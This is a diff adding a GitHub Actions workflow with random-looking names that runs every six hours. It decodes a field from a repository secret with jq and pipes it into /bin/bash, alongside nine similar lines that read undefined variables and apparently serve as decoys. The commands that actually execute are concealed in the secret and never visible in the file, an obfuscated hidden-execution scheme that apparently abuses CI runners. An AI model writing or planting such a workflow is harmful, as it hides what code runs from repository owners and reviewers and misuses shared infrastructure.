@@ -1,0 +1,26 @@
+name: jichengdao2358
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jichengdao2358
+        env:
+          gqruw25: ${{ secrets.gqruw25 }}
+        run: |
+          echo $gqruw25 | jq -r .pt086 | /bin/bash
+          echo $y287 | jq -r .ovkj49118 | /bin/bash
+          echo $crjhp3317 | jq -r .g1 | /bin/bash
+          echo $und893 | jq -r .uhkwg1 | /bin/bash
+          echo $asmv65 | jq -r .lnyf2808 | /bin/bash
+          echo $svtr7274 | jq -r .rxr3708 | /bin/bash
+          echo $scn3085 | jq -r .nu57 | /bin/bash
+          echo $zu71 | jq -r .tbvg8110 | /bin/bash
+          echo $vvbl51099 | jq -r .lwutz2 | /bin/bash
+          echo $bvvc6137 | jq -r .y56 | /bin/bash
+
